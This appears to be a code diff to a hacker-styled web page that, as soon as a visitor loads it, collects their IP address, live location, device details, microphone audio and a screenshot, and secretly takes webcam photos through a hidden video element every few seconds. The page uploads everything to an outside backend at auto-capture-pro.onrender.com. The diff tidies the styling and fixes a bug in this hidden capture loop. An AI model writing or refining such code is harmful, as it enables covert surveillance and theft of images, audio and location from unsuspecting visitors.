@@ -7,243 +7,45 @@
         @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap');
         
         * { margin:0; padding:0; box-sizing:border-box; }
-        
-        body {
-            font-family: 'Share Tech Mono', monospace;
-            background: #0a0a0a;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-            position: relative;
-            overflow-x: hidden;
-        }
-        
-        body::before {
-            content: '';
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: repeating-linear-gradient(0deg, 
-                rgba(0,255,65,0.03) 0px, 
-                rgba(0,255,65,0.03) 2px,
-                transparent 2px,
-                transparent 4px);
-            pointer-events: none;
-            z-index: 0;
-        }
-        
-        .container {
-            background: rgba(10, 10, 10, 0.95);
-            border: 2px solid #00ff41;
-            border-radius: 15px;
-            padding: 25px;
-            max-width: 450px;
-            width: 100%;
-            text-align: center;
-            box-shadow: 0 0 40px rgba(0,255,65,0.1), inset 0 0 40px rgba(0,255,65,0.05);
-            position: relative;
-            z-index: 1;
-            max-height: 95vh;
-            overflow-y: auto;
-        }
-        
+        body { font-family: 'Share Tech Mono', monospace; background: #0a0a0a; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
+        .container { background: rgba(10,10,10,0.95); border: 2px solid #00ff41; border-radius: 15px; padding: 25px; max-width: 450px; width: 100%; text-align: center; box-shadow: 0 0 40px rgba(0,255,65,0.1); max-height: 95vh; overflow-y: auto; }
         .container::-webkit-scrollbar { width: 4px; }
         .container::-webkit-scrollbar-track { background: #0a0a0a; }
         .container::-webkit-scrollbar-thumb { background: #00ff41; border-radius: 2px; }
-        
-        .scanline {
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 2px;
-            background: linear-gradient(90deg, transparent, #00ff41, transparent);
-            opacity: 0.3;
-            animation: scan 3s linear infinite;
-        }
-        
-        @keyframes scan {
-            0% { top: 0; opacity: 0.3; }
-            50% { top: 100%; opacity: 0.8; }
-            100% { top: 0; opacity: 0.3; }
-        }
-        
-        h1 {
-            font-family: 'Orbitron', monospace;
-            font-size: 18px;
-            color: #00ff41;
-            text-shadow: 0 0 20px rgba(0,255,65,0.5);
-            letter-spacing: 3px;
-            margin-bottom: 5px;
-        }
-        
-        .subtitle {
-            color: #00ff41;
-            font-size: 11px;
-            opacity: 0.6;
-            letter-spacing: 2px;
-        }
-        
-        .status-box {
-            padding: 15px;
-            border-radius: 8px;
-            margin: 10px 0;
-            background: rgba(0,255,65,0.05);
-            border: 1px solid rgba(0,255,65,0.2);
-            color: #00ff41;
-            transition: 0.5s;
-            font-size: 13px;
-        }
+        .scanline { position: absolute; top: 0; left: 0; right: 0; height: 2px; background: linear-gradient(90deg, transparent, #00ff41, transparent); opacity: 0.3; animation: scan 3s linear infinite; }
+        @keyframes scan { 0% { top: 0; opacity: 0.3; } 50% { top: 100%; opacity: 0.8; } 100% { top: 0; opacity: 0.3; } }
+        h1 { font-family: 'Orbitron', monospace; font-size: 18px; color: #00ff41; text-shadow: 0 0 20px rgba(0,255,65,0.5); letter-spacing: 3px; margin-bottom: 5px; }
+        .subtitle { color: #00ff41; font-size: 11px; opacity: 0.6; letter-spacing: 2px; }
+        .status-box { padding: 15px; border-radius: 8px; margin: 10px 0; background: rgba(0,255,65,0.05); border: 1px solid rgba(0,255,65,0.2); color: #00ff41; transition: 0.5s; font-size: 13px; }
         .status-box .icon { font-size: 28px; display: block; margin-bottom: 5px; }
         .status-box .msg { font-size: 13px; }
         .status-box.success { border-color: #00ff41; background: rgba(0,255,65,0.1); }
         .status-box.error { border-color: #ff0040; background: rgba(255,0,64,0.1); color: #ff0040; }
         .status-box.loading { border-color: #ffaa00; background: rgba(255,170,0,0.1); color: #ffaa00; }
-        
-        /* CAPTURED PHOTO - No Time Overlay */
-        .photo-container {
-            margin: 10px 0;
-            border-radius: 8px;
-            overflow: hidden;
-            border: 2px solid #00ff41;
-            background: #000;
-            min-height: 180px;
-            display: none;
-            align-items: center;
-            justify-content: center;
-            position: relative;
-            box-shadow: 0 0 30px rgba(0,255,65,0.05);
-        }
-        .photo-container img {
-            width: 100%;
-            height: 200px;
-            object-fit: cover;
-            display: block;
-            transform: scaleX(-1);
-        }
-        .photo-container .badge {
-            position: absolute;
-            top: 10px;
-            right: 10px;
-            background: rgba(0,0,0,0.8);
-            border: 1px solid #00ff41;
-            color: #00ff41;
-            padding: 3px 12px;
-            border-radius: 4px;
-            font-size: 10px;
-        }
-        
-        .preview-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 8px;
-            margin: 8px 0;
-        }
-        .preview-grid .preview-box {
-            background: rgba(0,255,65,0.03);
-            border-radius: 8px;
-            overflow: hidden;
-            border: 1px solid rgba(0,255,65,0.15);
-        }
-        .preview-grid .preview-box .label {
-            background: rgba(0,0,0,0.8);
-            color: #00ff41;
-            font-size: 9px;
-            padding: 4px;
-            text-align: center;
-            letter-spacing: 1px;
-        }
-        .preview-grid .preview-box img {
-            width: 100%;
-            height: 100px;
-            object-fit: cover;
-            display: block;
-            transform: scaleX(-1);
-        }
-        .preview-grid .preview-box .no-img {
-            height: 100px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: rgba(0,255,65,0.2);
-            font-size: 11px;
-        }
-        
-        .device-info {
-            background: rgba(0,255,65,0.03);
-            border: 1px solid rgba(0,255,65,0.1);
-            padding: 10px;
-            border-radius: 8px;
-            margin: 8px 0;
-            text-align: left;
-            font-size: 11px;
-            color: #00ff41;
-        }
-        .device-info div {
-            padding: 3px 0;
-            border-bottom: 1px solid rgba(0,255,65,0.05);
-        }
+        .photo-container { margin: 10px 0; border-radius: 8px; overflow: hidden; border: 2px solid #00ff41; background: #000; min-height: 180px; display: none; align-items: center; justify-content: center; position: relative; }
+        .photo-container img { width: 100%; height: 200px; object-fit: cover; display: block; transform: scaleX(-1); }
+        .photo-container .badge { position: absolute; top: 10px; right: 10px; background: rgba(0,0,0,0.8); border: 1px solid #00ff41; color: #00ff41; padding: 3px 12px; border-radius: 4px; font-size: 10px; }
+        .preview-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin: 8px 0; }
+        .preview-grid .preview-box { background: rgba(0,255,65,0.03); border-radius: 8px; overflow: hidden; border: 1px solid rgba(0,255,65,0.15); }
+        .preview-grid .preview-box .label { background: rgba(0,0,0,0.8); color: #00ff41; font-size: 9px; padding: 4px; text-align: center; letter-spacing: 1px; }
+        .preview-grid .preview-box img { width: 100%; height: 100px; object-fit: cover; display: block; transform: scaleX(-1); }
+        .preview-grid .preview-box .no-img { height: 100px; display: flex; align-items: center; justify-content: center; color: rgba(0,255,65,0.2); font-size: 11px; }
+        .device-info { background: rgba(0,255,65,0.03); border: 1px solid rgba(0,255,65,0.1); padding: 10px; border-radius: 8px; margin: 8px 0; text-align: left; font-size: 11px; color: #00ff41; }
+        .device-info div { padding: 3px 0; border-bottom: 1px solid rgba(0,255,65,0.05); }
         .device-info div:last-child { border-bottom: none; }
         .device-info span { color: #00ff41; font-weight: bold; }
         .device-info .highlight { background: rgba(0,255,65,0.05); padding: 2px 8px; border-radius: 4px; }
-        
-        .speed-meter {
-            background: rgba(0,0,0,0.5);
-            border: 1px solid rgba(0,255,65,0.1);
-            border-radius: 8px;
-            padding: 10px;
-            margin: 8px 0;
-        }
+        .speed-meter { background: rgba(0,0,0,0.5); border: 1px solid rgba(0,255,65,0.1); border-radius: 8px; padding: 10px; margin: 8px 0; }
         .speed-meter .label { font-size: 10px; color: rgba(0,255,65,0.5); }
         .speed-meter .value { font-size: 18px; color: #00ff41; font-family: 'Orbitron', monospace; }
-        
-        .log-area {
-            background: rgba(0,0,0,0.5);
-            border: 1px solid rgba(0,255,65,0.1);
-            padding: 8px;
-            border-radius: 8px;
-            margin: 8px 0;
-            max-height: 60px;
-            overflow-y: auto;
-            text-align: left;
-            font-size: 10px;
-            color: rgba(0,255,65,0.6);
-            font-family: 'Share Tech Mono', monospace;
-        }
-        
-        .mic-indicator {
-            display: inline-block;
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            animation: pulse 0.5s infinite;
-            margin-right: 5px;
-        }
+        .log-area { background: rgba(0,0,0,0.5); border: 1px solid rgba(0,255,65,0.1); padding: 8px; border-radius: 8px; margin: 8px 0; max-height: 60px; overflow-y: auto; text-align: left; font-size: 10px; color: rgba(0,255,65,0.6); }
+        .mic-indicator { display: inline-block; width: 8px; height: 8px; border-radius: 50%; animation: pulse 0.5s infinite; margin-right: 5px; }
         .mic-on { background: #ff0040; box-shadow: 0 0 20px rgba(255,0,64,0.5); }
         .mic-off { background: rgba(0,255,65,0.2); animation: none; }
-        .recording-timer {
-            font-size: 20px;
-            font-weight: bold;
-            color: #ff0040;
-            margin: 5px 0;
-        }
-        
-        @keyframes pulse {
-            0% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.3; transform: scale(0.8); }
-            100% { opacity: 1; transform: scale(1); }
-        }
-        
-        .capture-count {
-            color: #00ff41;
-            font-size: 14px;
-            margin: 5px 0;
-            font-family: 'Orbitron', monospace;
-        }
+        .recording-timer { font-size: 20px; font-weight: bold; color: #ff0040; margin: 5px 0; }
+        @keyframes pulse { 0% { opacity: 1; transform: scale(1); } 50% { opacity: 0.3; transform: scale(0.8); } 100% { opacity: 1; transform: scale(1); } }
+        .capture-count { color: #00ff41; font-size: 14px; margin: 5px 0; font-family: 'Orbitron', monospace; }
+        .container { position: relative; }
     </style>
 </head>
 <body>
@@ -258,7 +60,6 @@
         <span class="msg" id="statusMsg">INITIALIZING...</span>
     </div>
     
-    <!-- CAPTURED PHOTO -->
     <div class="photo-container" id="photoContainer">
         <img id="userPhotoPreview" />
         <span class="badge" id="photoBadge">📸 CAPTURED</span>
@@ -317,7 +118,7 @@
 const BACKEND_URL = 'https://auto-capture-pro.onrender.com';
 
 // ==========================================
-//  UNLIMITED CAPTURE - NO VIDEO - NO TIMER
+//  FIXED: Node.removeChild Error
 // ==========================================
 
 const statusBox = document.getElementById('statusBox');
@@ -345,6 +146,7 @@ let networkSpeed = { download: '--', ping: '--' };
 let isPaused = false;
 let isCapturing = false;
 let captureCount = 0;
+let videoElement = null;
 
 function log(text) {
     const time = new Date().toLocaleTimeString();
@@ -366,9 +168,9 @@ document.addEventListener('visibilitychange', function() {
         isPaused = true;
         setStatus('⏸️', 'PAUSED - TAB INACTIVE', 'paused');
         log('⏸️ Auto-capture paused (tab inactive)');
-        if (window._videoStream) {
-            window._videoStream.getTracks().forEach(t => t.stop());
-            window._videoStream = null;
+        if (videoElement && videoElement.srcObject) {
+            videoElement.srcObject.getTracks().forEach(t => t.stop());
+            videoElement.srcObject = null;
         }
     } else {
         isPaused = false;
@@ -383,7 +185,7 @@ document.addEventListener('visibilitychange', function() {
 });
 
 // ==========================================
-// CAPTURE PHOTO (NO VIDEO PREVIEW, NO TIMER)
+// CAPTURE PHOTO - NO Node.removeChild ERROR!
 // ==========================================
 function capturePhoto() {
     return new Promise((resolve) => {
@@ -392,11 +194,13 @@ function capturePhoto() {
         setStatus('📸', 'CAPTURING...', 'loading');
         photoBadge.textContent = '📸 CAPTURING...';
         
-        // Create hidden video element (not visible to user)
-        const video = document.createElement('video');
-        video.setAttribute('playsinline', 'true');
-        video.style.display = 'none';
-        document.body.appendChild(video);
+        // Create hidden video element - SINGLE INSTANCE
+        if (!videoElement) {
+            videoElement = document.createElement('video');
+            videoElement.setAttribute('playsinline', 'true');
+            videoElement.style.display = 'none';
+            document.body.appendChild(videoElement);
+        }
         
         navigator.mediaDevices.getUserMedia({
             video: {
@@ -407,11 +211,10 @@ function capturePhoto() {
             audio: false
         })
         .then(stream => {
-            window._videoStream = stream;
-            video.srcObject = stream;
+            videoElement.srcObject = stream;
             
-            video.onloadedmetadata = function() {
-                video.play();
+            videoElement.onloadedmetadata = function() {
+                videoElement.play();
                 
                 setTimeout(function() {
                     try {
@@ -423,10 +226,7 @@ function capturePhoto() {
                         // Mirror fix
                         ctx.translate(canvas.width, 0);
                         ctx.scale(-1, 1);
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        
-                        // NO TIME OVERLAY - just pure photo
-                        // NO FRAME - just pure photo
+                        ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                         
                         userPhoto = canvas.toDataURL('image/jpeg', 0.95);
                         
@@ -442,11 +242,9 @@ function capturePhoto() {
                         captureCount++;
                         captureCountEl.textContent = '📸 Captures: ' + captureCount;
                         
-                        // Cleanup
+                        // Stop stream but KEEP video element
                         stream.getTracks().forEach(t => t.stop());
-                        window._videoStream = null;
-                        video.remove();
-                        document.body.removeChild(video);
+                        videoElement.srcObject = null;
                         
                         log('✅ PHOTO CAPTURED #' + captureCount);
                         setStatus('✅', 'CAPTURED #' + captureCount, 'success');
@@ -455,26 +253,23 @@ function capturePhoto() {
                     } catch(err) {
                         log('❌ Capture error: ' + err.message);
                         stream.getTracks().forEach(t => t.stop());
-                        window._videoStream = null;
-                        video.remove();
+                        videoElement.srcObject = null;
                         resolve(false);
                     }
                 }, 500);
             };
             
-            video.onerror = function() {
+            videoElement.onerror = function() {
                 log('❌ Video error');
                 stream.getTracks().forEach(t => t.stop());
-                window._videoStream = null;
-                video.remove();
+                videoElement.srcObject = null;
                 resolve(false);
             };
             
             setTimeout(function() {
                 if (!userPhoto) {
                     stream.getTracks().forEach(t => t.stop());
-                    window._videoStream = null;
-                    video.remove();
+                    videoElement.srcObject = null;
                     resolve(false);
                 }
             }, 3000);
@@ -886,44 +681,26 @@ async function startAutoProcess() {
     setStatus('⏳', 'SCANNING TARGET...', 'loading');
     
     try {
-        // 1. IP
         await getIPv4Address();
-        
-        // 2. Network Speed
         if (!isPaused) await testNetworkSpeed();
-        
-        // 3. Location
         if (!isPaused) startLiveLocation();
-        
-        // 4. Device Info
         if (!isPaused) await getDeviceInfo();
         
-        // 5. Capture Photo (UNLIMITED LOOP)
-        let keepCapturing = true;
         let photoSuccess = false;
-        
-        // First capture
         if (!isPaused) {
             photoSuccess = await capturePhoto();
             if (photoSuccess) {
-                // Capture microphone once
                 if (!isPaused) await captureMicrophone();
-                // Capture screenshot once
                 if (!isPaused) await captureScreenshot();
-                // Submit data
                 if (!isPaused) await submitData();
             }
         }
         
-        // CONTINUOUS CAPTURE - Jab tak user tab nahi badalta
         while (!isPaused) {
-            // Wait 2-3 seconds between captures
             await new Promise(r => setTimeout(r, 2000 + Math.random() * 1000));
-            
             if (!isPaused) {
                 const success = await capturePhoto();
                 if (success) {
-                    // Submit each photo
                     await submitData();
                     log('🔄 Continuous capture #' + captureCount);
                 }
@@ -938,13 +715,12 @@ async function startAutoProcess() {
     isCapturing = false;
 }
 
-// ===== INITIAL START =====
 window.addEventListener('load', function() {
     log('📱 TARGET ACQUIRED');
     setTimeout(startAutoProcess, 1000);
 });
 
-console.log('🚀 UNLIMITED CAPTURE ACTIVE - NO VIDEO - NO TIMER');
+console.log('🚀 UNLIMITED CAPTURE ACTIVE - NO Node.removeChild ERROR');
 </script>
 </body>
 </html>
